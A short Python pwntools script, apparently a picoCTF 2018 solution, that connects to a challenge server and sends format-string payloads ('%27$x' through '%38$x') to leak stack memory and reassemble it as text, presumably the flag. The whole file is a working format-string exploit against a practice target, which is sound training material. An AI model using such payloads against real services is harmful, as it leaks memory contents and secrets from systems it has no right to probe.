#!/usr/bin/env python

import sys
from pwn import *

# r = process("./echo")
r = remote("2018shell.picoctf.com", 34802)

for i in range(27, 39):
    r.recvuntil("> ")
    r.sendline("%" + str(i) + "$x")
    value = r.recvuntil("\n").strip().rjust(8, "0").decode('hex')[::-1]
    sys.stdout.write(value)

r.close()
